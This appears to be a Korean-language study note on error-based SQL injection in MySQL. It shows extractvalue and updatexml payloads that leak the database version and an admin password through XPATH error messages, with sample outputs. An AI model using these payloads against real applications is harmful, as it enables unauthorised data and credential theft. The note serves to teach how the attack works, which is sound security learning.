--애플리케이션에서 발생하는 에러를 이용해 공격하려 한다면 뭄법 에러와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러가 아닌 런타임 즉, 쿼리가 실행되고나서 발생하는 에러가 필요
--아래 코드의 결과는 에러 메시지에 운영 체제에 대한 정보가 포함되어 있는 것을 확인할 수 있다.
--공격자는 해당 정보를 통해서 1-DAY 또는 0-DAY 공격을 통해 서버를 장악할 수 있다.
SELECT extractvalue(1,concat(0x3a,version()));
-- ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'

-- extractvalue 함수는 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH식을 통해 데이터를 추출
-- 두 번째 인자가 올바르지 않은 XPATH 식일 경우 올바르지 않는 XPATH 식이라는 에러 메시지와 함께 잘못된 식을 출력

-- 올바른 예시
 SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
+-----------------------------------------------+
| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+-----------------------------------------------+
| test                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)

-- 잘못된 예시
SELECT extractvalue(1, ':abcd');
--ERROR 1105 (HY000): XPATH syntax error: ':abcd'
-- ":" 로 시작하면 올바르지 않은 XPATH 식

--extractvalue 응용
--함수를 응용해 사용할 경우 데이터베이스의 정보를 추출할 수 있다
SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
--ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'


-- DBMS 별로 Error based SQLI를 통해 공격하는 방법
SELECT updatexml(null,concat(0x0a,version()),null);
--ERROR 1105 (HY000): XPATH syntax error: '5.7.29-0ubuntu0.16.04.1-log'




